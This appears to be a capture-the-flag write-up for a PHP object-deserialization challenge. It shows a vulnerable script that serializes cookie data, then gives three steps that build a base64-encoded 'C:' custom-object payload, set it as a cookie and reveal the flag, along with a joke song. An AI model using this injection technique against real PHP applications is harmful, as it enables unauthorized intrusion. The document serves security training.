```
<?php

include "flag.php";

class Flag {
    public function __destruct() {
       global $flag;
       echo $flag; 
    }
}

if (isset ($_POST['value']) and ! empty ($_POST['value'])) {
    /* Add a value twice to remove it from the list. */
    if (($key = array_search ($_POST['value'], $data)) !== false) {
        unset ($data[$key]);
    } else { /* Else, simply add it. */
        array_push ($data, $_POST['value']);
    }
    setcookie ('data', base64_encode (serialize ($data)));
}

?>
```
STEP 1: Serialize the Flag class object with custom with Custom Object
OUTPUT: C:4:"Flag":0:{}

STEP 2: Base64 Encode of Output
OUTPUT: Qzo0OiJGbGFnIjowOnt9

STEP 3: Set the cookie value(data) as Qzo0OiJGbGFnIjowOnt9
OUTPUT: 
I threw a class in the well Don't ask me I'll never tell I looked at you as it fell 
And now you're in my way I trade my soul for a shell Pennies and dimes for a leak I
wasn't looking for this But now you're in my way Your stare was holding Ripped code
stacktrace was showing Hot night Wind was blowing Where you think you're going baby?
Hey I just met you And this is crazy But here's my method So call it maybe It's hard 
to look right at you baby But here's my method So call it maybe Hey I just met you And 
this is crazy But here's my method So call it maybe And all the other hackers Try to 
chase me But here's it method So call me maybe 
WEBSEC{CVE-2012-5692_was_a_lof_of_phun_thanks_to_i0n1c_but_this_was_not_the_only_bypass}
